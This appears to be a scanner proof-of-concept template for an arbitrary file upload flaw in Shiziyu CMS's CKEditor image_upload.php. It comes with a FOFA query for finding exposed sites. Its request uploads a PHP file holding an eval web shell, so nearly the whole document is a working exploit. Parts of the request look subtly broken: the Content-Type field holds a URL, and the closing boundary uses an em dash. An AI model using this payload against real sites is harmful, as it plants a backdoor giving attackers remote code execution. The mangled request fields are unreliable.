expression: r0()
id: shiziyu-cms-image_upload.php-Anyfileupload
info:
  author: daffainfo
  description: "\u72EE\u5B50\u9C7CCMS\u4F7F\u7528CK\u7F16\u8F91\u5668\uFF0C\u5B58\u5728\
    \u56FE\u7247\u4E0A\u4F20\u7684\u7ED5\u8FC7\uFF0C\u9020\u6210 image_upload.php\
    \ \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20\nfofa-query: \"/seller.php?s=/Public/login\"\
    \n"
  name: "\u72EE\u5B50\u9C7CCMS image_upload.php \u4EFB\u610F\u6587\u4EF6\u4E0A\u4F20"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20image_upload.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.md
  severity: critical
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(bytes(r1))
    request:
      body: "------WebKitFormBoundary{{rboundary}}\nContent-Disposition: form-data;\
        \ name=\"files\"; filename=\"{{r1}}.php\"\nContent-Type: http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/gif\n\
        \n<?php @eval($_POST[test]);?>\n------WebKitFormBoundary{{rboundary}}\u2014\
        \n"
      headers:
        Content-Type: multipart/form-data;boundary=----WebKitFormBoundary{{rboundary}}
      method: POST
      path: /Common/ckeditor/plugins/multiimg/dialogs/image_upload.php
set:
  r1: randomLowercase(20)
  rboundary: randomLowercase(8)
